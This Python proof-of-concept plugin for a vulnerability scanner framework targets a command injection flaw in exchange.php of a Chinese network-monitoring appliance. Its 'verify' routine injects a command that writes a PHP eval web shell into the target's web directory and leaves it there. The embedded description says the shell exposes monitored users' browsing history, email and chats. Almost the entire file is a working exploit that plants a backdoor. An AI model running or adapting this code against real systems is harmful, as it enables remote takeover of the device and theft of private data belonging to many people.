# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import urllib

class Vuln(ABVuln):
    vuln_id = 'Seentech_0015' # 平台漏洞编号，留空
    name = '中科新业网络哨兵 远程命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵系统exchange.php远程命令执行漏洞。
        执行getshell，导致其所监控的网络内网络用户隐私泄露，包括上网记录，邮件，聊天记录等。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '02f7e442-109d-4146-9a2a-c4347c145b19'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #http://www.wooyun.org/bugs/wooyun-2015-0110528
            hh = hackhttp.hackhttp()
            url = self.target
            randnum = random.randint(666, 6666)
            cmd = "echo {data} | base64 -d > {filename}".format(
                    data="<?php print(md5('1'));@eval($_POST[0]);?>".encode("base64").strip(),
                    filename="testvul"+str(randnum)+".php",
                )
            cmd = urllib.quote(cmd)
            exp_url =url + "/manage/admin/exchange.php?sys=whoami;{cmd};".format(cmd=cmd)
            vef_url = url + "/manage/admin/testvul{num}.php".format(num=randnum)
            #headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
            code1, _, res1, _, _ = hh.http(exp_url)
            code2, _, res2, _, _ = hh.http(vef_url)
            if code2 ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res2:
                #security_hole(vef_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
